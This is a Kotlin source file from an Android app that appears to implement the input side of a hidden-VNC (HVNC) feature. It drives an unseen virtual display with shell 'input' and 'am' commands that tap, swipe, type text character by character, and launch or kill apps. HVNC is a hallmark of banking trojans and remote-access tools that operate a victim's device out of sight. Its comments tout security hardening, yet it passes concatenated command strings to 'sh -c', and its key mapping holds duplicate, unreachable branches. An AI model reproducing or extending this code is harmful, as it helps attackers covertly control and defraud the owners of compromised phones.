package com.fason.app.features.hvnc

import android.content.Context
import android.graphics.PointF
import android.os.Build
import android.util.Log
import android.view.KeyEvent
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.concurrent.TimeUnit

/**
 * HvncInputInjector - Tiêm input vào virtual display với bảo mật tối đa:
 * 
 * - Tất cả input đều qua HvncSecurityManager để sanitize
 * - Shell execution được sandbox với timeout cứng
 * - Sử dụng ProcessBuilder thay vì Runtime.exec()
 * - Environment variables được strip để chống injection
 * - Whitelist package name validation
 * - Không log shell command đầy đủ (chỉ log action type)
 */
class HvncInputInjector(
    private val context: Context,
    private val displayTag: String = "default"
) {

    companion object {
        private const val TAG = "HvncInput"
        private const val SHELL_TIMEOUT_SECONDS = 2L
        private const val MAX_SHELL_OUTPUT = 4096
    }

    var displayId: Int = -1

    /**
     * Tap với tọa độ đã được sanitize.
     */
    fun tap(x: Float, y: Float) {
        if (displayId < 0) return
        val safeX = HvncSecurityManager.sanitizeCoordinate(x, 1920f)
        val safeY = HvncSecurityManager.sanitizeCoordinate(y, 3840f)
        execShellInput("tap ${safeX.toInt()} ${safeY.toInt()}")
    }

    /**
     * Swipe với tọa độ và duration đã được sanitize.
     */
    fun swipe(startX: Float, startY: Float, endX: Float, endY: Float, durationMs: Long = 300) {
        if (displayId < 0) return
        val safeSx = HvncSecurityManager.sanitizeCoordinate(startX, 1920f)
        val safeSy = HvncSecurityManager.sanitizeCoordinate(startY, 3840f)
        val safeEx = HvncSecurityManager.sanitizeCoordinate(endX, 1920f)
        val safeEy = HvncSecurityManager.sanitizeCoordinate(endY, 3840f)
        val safeDuration = HvncSecurityManager.sanitizeDuration(durationMs)
        execShellInput("swipe ${safeSx.toInt()} ${safeSy.toInt()} ${safeEx.toInt()} ${safeEy.toInt()} $safeDuration")
    }

    /**
     * Gesture đa điểm với sanitization.
     */
    fun gesture(points: List<PointF>, durationMs: Long) {
        if (displayId < 0 || points.isEmpty()) return
        if (points.size == 1) {
            tap(points[0].x, points[0].y)
            return
        }
        val first = points.first()
        val last = points.last()
        swipe(first.x, first.y, last.x, last.y, durationMs)
    }

    /**
     * Key event với validation keyCode.
     */
    fun keyEvent(keyCode: String) {
        if (displayId < 0) return
        if (!HvncSecurityManager.validateKeyCode(keyCode)) {
            Log.w(TAG, "[$displayTag] Invalid keyCode rejected: $keyCode")
            return
        }
        val androidKeyCode = when (keyCode.lowercase()) {
            "back" -> KeyEvent.KEYCODE_BACK
            "home" -> KeyEvent.KEYCODE_HOME
            "recents", "app_switch" -> KeyEvent.KEYCODE_APP_SWITCH
            "enter" -> KeyEvent.KEYCODE_ENTER
            "delete", "backspace" -> KeyEvent.KEYCODE_DEL
            "power" -> KeyEvent.KEYCODE_POWER
            "menu" -> KeyEvent.KEYCODE_MENU
            "tab" -> KeyEvent.KEYCODE_TAB
            "escape" -> KeyEvent.KEYCODE_ESCAPE
            "volume_up" -> KeyEvent.KEYCODE_VOLUME_UP
            "volume_down" -> KeyEvent.KEYCODE_VOLUME_DOWN
            "volume_mute" -> KeyEvent.KEYCODE_VOLUME_MUTE
            else -> keyCode.toIntOrNull() ?: return
        }
        execShellKeyEvent(androidKeyCode)
    }

    /**
     * Type text với sanitization nghiêm ngặt.
     *
     * ⚠️ Android `input text` KHÔNG hỗ trợ flag -d (display) — text luôn inject
     * vào màn hình thật. Do đó ta dùng `input -d <id> keyevent` cho từng ký tự
     * với bảng mapping character → keycode + meta state (shift).
     *
     * Triển khai: gom tất cả lệnh keyevent vào một shell script duy nhất
     * để tránh overhead spawn process cho từng ký tự.
     */
    fun typeText(text: String) {
        if (displayId < 0 || text.isEmpty()) return

        val sanitized = HvncSecurityManager.sanitizeText(text)
        if (sanitized.isEmpty()) return

        // Build batch keyevent script — mỗi ký tự thành 1+ dòng input keyevent
        val sb = StringBuilder()
        for (char in sanitized) {
            val events = charToKeyEvents(char)
            for ((keyCode, metaState) in events) {
                if (metaState != 0) {
                    sb.append("input -d $displayId keyevent --meta-state $metaState $keyCode;")
                } else {
                    sb.append("input -d $displayId keyevent $keyCode;")
                }
            }
        }
        if (sb.isEmpty()) return

        // Execute all keyevents in one shell invocation
        execShell(sb.toString())
    }

    // ─── Character → KeyEvent Mapping ────────────────────────────────

    /**
     * Map một ký tự ASCII printable thành danh sách (keyCode, metaState).
     * metaState != 0 nghĩa là cần SHIFT (để gõ uppercase hoặc ký hiệu).
     * Một ký tự có thể cần nhiều key event (vd: 'A' = [SHIFT_DOWN, A_DOWN, A_UP, SHIFT_UP]
     * nhưng Android `input keyevent --meta-state` gộp được thành 1 lệnh).
     *
     * Trả về danh sách rỗng nếu không map được.
     */
    private fun charToKeyEvents(char: Char): List<Pair<Int, Int>> {
        // metaState 0 = no shift, 1 = SHIFT (META_SHIFT_ON)
        val NO_SHIFT = 0
        val SHIFT = 1  // KeyEvent.META_SHIFT_ON

        return when (char) {
            // ── Lowercase letters ──────────────────────────────────
            'a' -> listOf(KeyEvent.KEYCODE_A to NO_SHIFT)
            'b' -> listOf(KeyEvent.KEYCODE_B to NO_SHIFT)
            'c' -> listOf(KeyEvent.KEYCODE_C to NO_SHIFT)
            'd' -> listOf(KeyEvent.KEYCODE_D to NO_SHIFT)
            'e' -> listOf(KeyEvent.KEYCODE_E to NO_SHIFT)
            'f' -> listOf(KeyEvent.KEYCODE_F to NO_SHIFT)
            'g' -> listOf(KeyEvent.KEYCODE_G to NO_SHIFT)
            'h' -> listOf(KeyEvent.KEYCODE_H to NO_SHIFT)
            'i' -> listOf(KeyEvent.KEYCODE_I to NO_SHIFT)
            'j' -> listOf(KeyEvent.KEYCODE_J to NO_SHIFT)
            'k' -> listOf(KeyEvent.KEYCODE_K to NO_SHIFT)
            'l' -> listOf(KeyEvent.KEYCODE_L to NO_SHIFT)
            'm' -> listOf(KeyEvent.KEYCODE_M to NO_SHIFT)
            'n' -> listOf(KeyEvent.KEYCODE_N to NO_SHIFT)
            'o' -> listOf(KeyEvent.KEYCODE_O to NO_SHIFT)
            'p' -> listOf(KeyEvent.KEYCODE_P to NO_SHIFT)
            'q' -> listOf(KeyEvent.KEYCODE_Q to NO_SHIFT)
            'r' -> listOf(KeyEvent.KEYCODE_R to NO_SHIFT)
            's' -> listOf(KeyEvent.KEYCODE_S to NO_SHIFT)
            't' -> listOf(KeyEvent.KEYCODE_T to NO_SHIFT)
            'u' -> listOf(KeyEvent.KEYCODE_U to NO_SHIFT)
            'v' -> listOf(KeyEvent.KEYCODE_V to NO_SHIFT)
            'w' -> listOf(KeyEvent.KEYCODE_W to NO_SHIFT)
            'x' -> listOf(KeyEvent.KEYCODE_X to NO_SHIFT)
            'y' -> listOf(KeyEvent.KEYCODE_Y to NO_SHIFT)
            'z' -> listOf(KeyEvent.KEYCODE_Z to NO_SHIFT)

            // ── Uppercase letters = SHIFT + lowercase ──────────────
            'A' -> listOf(KeyEvent.KEYCODE_A to SHIFT)
            'B' -> listOf(KeyEvent.KEYCODE_B to SHIFT)
            'C' -> listOf(KeyEvent.KEYCODE_C to SHIFT)
            'D' -> listOf(KeyEvent.KEYCODE_D to SHIFT)
            'E' -> listOf(KeyEvent.KEYCODE_E to SHIFT)
            'F' -> listOf(KeyEvent.KEYCODE_F to SHIFT)
            'G' -> listOf(KeyEvent.KEYCODE_G to SHIFT)
            'H' -> listOf(KeyEvent.KEYCODE_H to SHIFT)
            'I' -> listOf(KeyEvent.KEYCODE_I to SHIFT)
            'J' -> listOf(KeyEvent.KEYCODE_J to SHIFT)
            'K' -> listOf(KeyEvent.KEYCODE_K to SHIFT)
            'L' -> listOf(KeyEvent.KEYCODE_L to SHIFT)
            'M' -> listOf(KeyEvent.KEYCODE_M to SHIFT)
            'N' -> listOf(KeyEvent.KEYCODE_N to SHIFT)
            'O' -> listOf(KeyEvent.KEYCODE_O to SHIFT)
            'P' -> listOf(KeyEvent.KEYCODE_P to SHIFT)
            'Q' -> listOf(KeyEvent.KEYCODE_Q to SHIFT)
            'R' -> listOf(KeyEvent.KEYCODE_R to SHIFT)
            'S' -> listOf(KeyEvent.KEYCODE_S to SHIFT)
            'T' -> listOf(KeyEvent.KEYCODE_T to SHIFT)
            'U' -> listOf(KeyEvent.KEYCODE_U to SHIFT)
            'V' -> listOf(KeyEvent.KEYCODE_V to SHIFT)
            'W' -> listOf(KeyEvent.KEYCODE_W to SHIFT)
            'X' -> listOf(KeyEvent.KEYCODE_X to SHIFT)
            'Y' -> listOf(KeyEvent.KEYCODE_Y to SHIFT)
            'Z' -> listOf(KeyEvent.KEYCODE_Z to SHIFT)

            // ── Digits ─────────────────────────────────────────────
            '0' -> listOf(KeyEvent.KEYCODE_0 to NO_SHIFT)
            '1' -> listOf(KeyEvent.KEYCODE_1 to NO_SHIFT)
            '2' -> listOf(KeyEvent.KEYCODE_2 to NO_SHIFT)
            '3' -> listOf(KeyEvent.KEYCODE_3 to NO_SHIFT)
            '4' -> listOf(KeyEvent.KEYCODE_4 to NO_SHIFT)
            '5' -> listOf(KeyEvent.KEYCODE_5 to NO_SHIFT)
            '6' -> listOf(KeyEvent.KEYCODE_6 to NO_SHIFT)
            '7' -> listOf(KeyEvent.KEYCODE_7 to NO_SHIFT)
            '8' -> listOf(KeyEvent.KEYCODE_8 to NO_SHIFT)
            '9' -> listOf(KeyEvent.KEYCODE_9 to NO_SHIFT)

            // ── Whitespace ─────────────────────────────────────────
            ' '  -> listOf(KeyEvent.KEYCODE_SPACE to NO_SHIFT)
            '\n' -> listOf(KeyEvent.KEYCODE_ENTER to NO_SHIFT)
            '\t' -> listOf(KeyEvent.KEYCODE_TAB to NO_SHIFT)

            // ── Common punctuation (no shift) ─────────────────────
            ','  -> listOf(KeyEvent.KEYCODE_COMMA to NO_SHIFT)
            '.'  -> listOf(KeyEvent.KEYCODE_PERIOD to NO_SHIFT)
            '-'  -> listOf(KeyEvent.KEYCODE_MINUS to NO_SHIFT)
            '='  -> listOf(KeyEvent.KEYCODE_EQUALS to NO_SHIFT)
            '['  -> listOf(KeyEvent.KEYCODE_LEFT_BRACKET to NO_SHIFT)
            ']'  -> listOf(KeyEvent.KEYCODE_RIGHT_BRACKET to NO_SHIFT)
            '\\' -> listOf(KeyEvent.KEYCODE_BACKSLASH to NO_SHIFT)
            ';'  -> listOf(KeyEvent.KEYCODE_SEMICOLON to NO_SHIFT)
            '\'' -> listOf(KeyEvent.KEYCODE_APOSTROPHE to NO_SHIFT)
            '/'  -> listOf(KeyEvent.KEYCODE_SLASH to NO_SHIFT)
            '`'  -> listOf(KeyEvent.KEYCODE_GRAVE to NO_SHIFT)

            // ── Shifted punctuation (symbols on number keys) ──────
            '!'  -> listOf(KeyEvent.KEYCODE_1 to SHIFT)
            '@'  -> listOf(KeyEvent.KEYCODE_2 to SHIFT)
            '#'  -> listOf(KeyEvent.KEYCODE_3 to SHIFT)
            '$'  -> listOf(KeyEvent.KEYCODE_4 to SHIFT)
            '%'  -> listOf(KeyEvent.KEYCODE_5 to SHIFT)
            '^'  -> listOf(KeyEvent.KEYCODE_6 to SHIFT)
            '&'  -> listOf(KeyEvent.KEYCODE_7 to SHIFT)
            '*'  -> listOf(KeyEvent.KEYCODE_8 to SHIFT)
            '('  -> listOf(KeyEvent.KEYCODE_9 to SHIFT)
            ')'  -> listOf(KeyEvent.KEYCODE_0 to SHIFT)
            '_'  -> listOf(KeyEvent.KEYCODE_MINUS to SHIFT)
            '+'  -> listOf(KeyEvent.KEYCODE_EQUALS to SHIFT)
            '{'  -> listOf(KeyEvent.KEYCODE_LEFT_BRACKET to SHIFT)
            '}'  -> listOf(KeyEvent.KEYCODE_RIGHT_BRACKET to SHIFT)
            '|'  -> listOf(KeyEvent.KEYCODE_BACKSLASH to SHIFT)
            ':'  -> listOf(KeyEvent.KEYCODE_SEMICOLON to SHIFT)
            '"'  -> listOf(KeyEvent.KEYCODE_APOSTROPHE to SHIFT)
            '<'  -> listOf(KeyEvent.KEYCODE_COMMA to SHIFT)
            '>'  -> listOf(KeyEvent.KEYCODE_PERIOD to SHIFT)
            '?'  -> listOf(KeyEvent.KEYCODE_SLASH to SHIFT)
            '~'  -> listOf(KeyEvent.KEYCODE_GRAVE to SHIFT)

            // ── Numpad / special ──────────────────────────────────
            '*'  -> listOf(KeyEvent.KEYCODE_NUMPAD_MULTIPLY to NO_SHIFT)
            '/'  -> listOf(KeyEvent.KEYCODE_NUMPAD_DIVIDE to NO_SHIFT)
            '+'  -> listOf(KeyEvent.KEYCODE_NUMPAD_ADD to NO_SHIFT)
            '-'  -> listOf(KeyEvent.KEYCODE_NUMPAD_SUBTRACT to NO_SHIFT)
            '.'  -> listOf(KeyEvent.KEYCODE_NUMPAD_DOT to NO_SHIFT)

            else -> emptyList() // Ký tự không được hỗ trợ → bỏ qua
        }
    }

    /**
     * Launch app với package name validation chặt chẽ.
     */
    fun launchApp(packageName: String) {
        if (displayId < 0) return

        // Validate package name với whitelist
        val safePkg = HvncSecurityManager.sanitizePackageName(packageName)
        if (safePkg == null) {
            Log.w(TAG, "[$displayTag] Invalid package name rejected: $packageName")
            return
        }

        val launchActivity = getLaunchActivity(safePkg)
        if (launchActivity != null) {
            execShell("am start -n $safePkg/$launchActivity --display $displayId")
        } else {
            execShell(
                "am start --display $displayId -a android.intent.action.MAIN " +
                    "-c android.intent.category.LAUNCHER $safePkg"
            )
        }
    }

    /**
     * Close app với package name validation.
     */
    fun closeApp(packageName: String) {
        val safePkg = HvncSecurityManager.sanitizePackageName(packageName) ?: return
        execShell("am force-stop $safePkg")
    }

    /**
     * Điều chỉnh âm lượng.
     */
    fun adjustVolume(direction: String) {
        val keyCode = when (direction.lowercase()) {
            "up" -> KeyEvent.KEYCODE_VOLUME_UP
            "down" -> KeyEvent.KEYCODE_VOLUME_DOWN
            "mute" -> KeyEvent.KEYCODE_VOLUME_MUTE
            else -> return
        }
        execShell("input keyevent $keyCode")
    }

    // ─── Private Methods ───────────────────────────────────────────

    private fun getLaunchActivity(packageName: String): String? {
        return try {
            val pm = context.packageManager
            val intent = pm.getLaunchIntentForPackage(packageName) ?: return null
            intent.component?.className
        } catch (e: Exception) {
            Log.w(TAG, "[$displayTag] Could not resolve launch activity for $packageName")
            null
        }
    }

    private fun execShellInput(inputArgs: String) {
        execShell("input -d $displayId $inputArgs")
    }

    private fun execShellKeyEvent(keyCode: Int) {
        execShell("input -d $displayId keyevent $keyCode")
    }

    /**
     * Sandboxed shell execution với ProcessBuilder.
     * - Timeout cứng 2 giây
     * - Environment variables bị strip
     * - Working directory là app-private
     * - Output bị giới hạn kích thước
     * - Không log command đầy đủ
     */
    private fun execShell(command: String) {
        var process: Process? = null
        try {
            val pb = ProcessBuilder("sh", "-c", command)
                .directory(context.filesDir)  // Working directory an toàn
                .redirectErrorStream(true)

            // Strip environment variables để chống injection
            pb.environment().clear()
            pb.environment()["PATH"] = "/system/bin:/system/xbin"
            pb.environment()["HOME"] = context.filesDir.absolutePath

            process = pb.start()

            // Timeout cứng
            val completed = process.waitFor(SHELL_TIMEOUT_SECONDS, TimeUnit.SECONDS)
            if (!completed) {
                Log.w(TAG, "[$displayTag] Shell command timed out, killing process")
                process.destroyForcibly()
                process.waitFor(1, TimeUnit.SECONDS)
                return
            }

            val exitCode = process.exitValue()
            if (exitCode != 0) {
                val reader = BufferedReader(InputStreamReader(process.inputStream))
                val output = StringBuilder()
                var line: String?
                var totalRead = 0
                while (reader.readLine().also { line = it } != null && totalRead < MAX_SHELL_OUTPUT) {
                    output.append(line).append('\n')
                    totalRead += line!!.length
                }
                reader.close()
                if (output.isNotEmpty()) {
                    // Chỉ log loại action, không log command đầy đủ để tránh lộ thông tin
                    Log.w(TAG, "[$displayTag] Shell action failed (exit=$exitCode)")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "[$displayTag] Shell execution error", e)
        } finally {
            try { process?.destroyForcibly() } catch (_: Exception) {}
        }
    }
}